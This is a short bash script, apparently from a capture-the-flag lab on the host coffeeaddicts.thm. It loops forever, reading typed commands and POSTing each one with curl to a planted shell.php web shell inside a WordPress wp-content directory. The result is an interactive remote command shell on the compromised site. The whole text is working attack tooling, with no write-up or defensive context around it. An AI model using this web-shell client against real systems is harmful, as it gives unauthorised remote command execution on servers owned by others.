while true; do
    read -p "$ " cmd
    curl -X POST http://coffeeaddicts.thm/wordpress/wp-content/shell.php --data-urlencode "cmd=$cmd"
done
